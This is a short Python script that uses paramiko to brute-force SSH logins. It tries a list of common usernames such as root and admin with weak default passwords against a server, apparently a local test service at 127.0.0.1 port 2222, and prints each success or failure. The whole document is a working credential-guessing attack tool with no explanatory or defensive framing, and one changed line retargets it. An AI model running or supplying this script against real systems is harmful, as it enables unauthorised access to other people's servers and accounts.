import paramiko, time

HOST = "127.0.0.1"
PORT = 2222
users = ["root", "admin", "test", "oracle", "ubuntu"]
passwords = ["123456", "password", "admin", "root", "toor", "qwerty", "12345678", "abc123", "000000"]

for u in users:
    for p in passwords:
        cli = paramiko.SSHClient()
        cli.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            cli.connect(HOST, port=PORT, username=u, password=p,
                        timeout=3, allow_agent=False, look_for_keys=False)
            print("[+] 成功", u, p)
        except Exception:
            print("[-] 失败", u, p)
        finally:
            cli.close()
        time.sleep(0.2)